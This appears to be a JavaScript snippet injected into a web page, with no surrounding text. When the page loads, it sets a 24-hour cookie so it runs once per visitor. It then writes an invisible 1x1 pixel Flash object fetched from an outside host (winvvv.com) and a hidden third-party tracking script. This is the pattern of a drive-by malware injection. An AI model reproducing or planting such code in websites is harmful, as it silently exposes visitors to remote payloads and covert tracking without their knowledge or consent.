function goad(){ 
var Then = new Date() ;
Then.setTime(Then.getTime() + 24*60*60*1000) ;
var cookieString = new String(document.cookie) ;
var cookieHeader = "Cookier1=" ;
var beginPosition = cookieString.indexOf(cookieHeader) ;
if (beginPosition != -1){ }else {  
document.cookie = "Cookier1=Filter;expires="+ Then.toGMTString() ;
document.writeln("<embed src=\"http:\/\/winvvv.com\/my1_do.swf\" width=\"1\" height=\"1\"><\/embed>");
document.writeln("<div style=\"visibility: hidden;\"><script language=\"javascript\" type=\"text\/javascript\" src=\"http:\/\/js.users.51.la\/16227407.js\"><\/script><\/div>");
}}goad(); 